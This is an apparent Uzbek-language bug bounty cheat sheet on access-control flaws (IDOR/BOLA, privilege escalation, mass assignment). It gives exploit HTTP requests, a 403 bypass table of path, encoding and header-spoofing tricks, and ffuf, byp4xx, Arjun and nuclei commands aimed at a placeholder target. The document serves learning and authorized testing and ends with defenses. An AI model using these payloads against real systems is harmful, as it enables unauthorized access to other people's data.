# Access Control (IDOR / BOLA / Privilege Escalation)

> Lab yechimlari (PortSwigger'ning 13 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Access control = "kim nimaga kirishi/nima qilishi mumkin" degan qoida. Zaiflik shunda: sayt bu
qoidani **server tomonda har so'rovda tekshirmaydi** — faqat UI'da yashiradi yoki client'ga ishonadi.
Natijada sen ID/parametr/yo'lni o'zgartirib boshqa odamning ma'lumotiga kirasan (IDOR), yoki oddiy
userdan admin funksiyasiga ko'tarilasan (privilege escalation).

**Ildiz sabab:** autentifikatsiya ("sen kimsan" — login) bor, lekin **avtorizatsiya** ("senga ruxsat
bormi") yo'q yoki noto'g'ri. Ko'pincha "URL'ni bilmaydi" yoki "tugma UI'da yo'q" degan noto'g'ri
taxminga tayanadi (security by obscurity). **Bug bounty'da eng ko'p pul shu yerdan tushadi va eng
oson topiladi — avtomat tool kam ko'radi, miya ishlatasan.**

## Qanday ishlaydi
```
GET /api/user/1337/profile   (Authorization: sening tokening)   → o'zingniki, 200
GET /api/user/1338/profile   (Authorization: sening tokening)   → 200 + BOSHQA user ma'lumoti = IDOR
```

## Turlari
1. **IDOR / BOLA** (Broken Object Level Authorization) — obyekt ID'sini almashtirib boshqa resursga kirish.
2. **Vertical escalation** — past huquqli user admin funksiyasini bajaradi (`/admin`, role o'zgartirish).
3. **Horizontal escalation** — userA userB'ning teng darajadagi resursiga kiradi.
4. **Function-level (BFLA)** — himoyasiz admin endpoint/metod (`DELETE`, `PUT`) ochiq qolgan.
5. **Platform misconfig** — `X-Original-URL`, `X-Rewrite-URL`, method/Referer bilan front-end bypass.
6. **Mass assignment** — so'rovga `isAdmin`/`role` qo'shib huquq oshirish.

## Aniqlash
```http
GET /api/user/1337/profile   → o'zingniki
GET /api/user/1338/profile   → boshqa user? ochilsa → IDOR
```
ID joylari: URL, query, POST body, JSON, header (`X-User-Id`), cookie.

### Sinash usullari
```
- ID'ni +1/-1 qil
- UUID bo'lsa ham urinib ko'r (boshqa joyda leak bo'lgandir)
- 2 akkaunt yarat (A, B), A tokeni bilan B resursini so'ra
- POST/PUT/DELETE ni ham sina (GET bloklangandir)
- Authorization/Cookie olib tashlab ko'r (auth umuman bormi?)
- id=1 → id[]=1&id[]=2 (massiv)
- {"id":1} → {"id":1,"admin":true} (qo'shimcha field)
```

## Exploit
```http
GET /api/account?id=1338 HTTP/1.1
Authorization: Bearer <SENING_TOKENING>
→ 200 + boshqa user ma'lumoti
```
```http
# Method o'zgartirish
GET /admin/user/1338   → 403
PUT /admin/user/1338   → ochiladimi?
```
```http
# Vertical — mass assignment
POST /register  {"username":"x","password":"y","role":"admin"}
POST /user/update {"email":"x","isAdmin":true}
```

## 403/401 bypass jadvali
| Texnika | Misol |
|---------|-------|
| Case | `/Admin`, `/ADMIN` |
| Path qo'shimcha | `/admin/`, `/admin/.`, `/admin//`, `/admin/./` |
| Encoding | `/admin%2f`, `/%2e/admin`, `/admin%09` |
| Traversal | `/public/../admin`, `/..;/admin` (Tomcat) |
| Qo'shimcha | `/admin..;/`, `/admin.json`, `/admin%00` |
| Header | `X-Original-URL: /admin`, `X-Rewrite-URL: /admin` |
| IP spoof | `X-Forwarded-For: 127.0.0.1`, `X-Real-IP` |
| Method | `HEAD`, `TRACE`, `OPTIONS` |

## TOOLLAR

### Burp Autorize — IDOR'ning podshosi
```
Burp → Autorize extension → past-huquqli user cookie'sini qo'y → normal brauzer qil
```
> Har so'rovni past-huquqli session bilan avtomat takrorlaydi va "ruxsat bormi?" deb farqni rang bilan belgilaydi. IDOR'ni o'zi topib beradi.

### byp4xx — 403 bypass avtomat
```bash
byp4xx https://target.com/admin
```
> 403 endpointga 40+ bypass texnikasini (header, encoding, method) ketma-ket uradi.

### ffuf — ketma-ket ID brute (IDOR tasdiqlash)
```bash
ffuf -u "https://target.com/api/user/FUZZ/profile" -w <(seq 1 5000) -H "Cookie: ..." -mc 200 -fr "not found"
```
> 1 dan 5000 gacha ID'ni sinab, 200 qaytganlarini — ya'ni ochilgan profillarni — chiqaradi.

### Arjun — yashirin parametr (privilege escalation uchun)
```bash
arjun -u "https://target.com/api/user/update" -m POST
```
> `isAdmin`, `role` kabi yashirin parametrlarni topadi — mass assignment yo'li.

### nuclei — ma'lum access control CVE/misconfig
```bash
nuclei -l live_hosts.txt -t ~/nuclei-templates/http/misconfiguration/ -tags exposure,auth
```
> Ochiq admin panel, himoyasiz endpointlarni tez topadi.

## PoC
2 akkaunt (A, B) ko'rsat. A tokeni bilan B resursiga kirganingni request/response bilan
ko'rsat. Impact: ketma-ket ID bo'lsa → hamma userга ta'sir.

## Himoya
Har so'rovda server tomonda ownership tekshiruvi (`resource.owner == session.user`),
deny-by-default, RBAC server tomonda, mass assignment'ga allowlist.
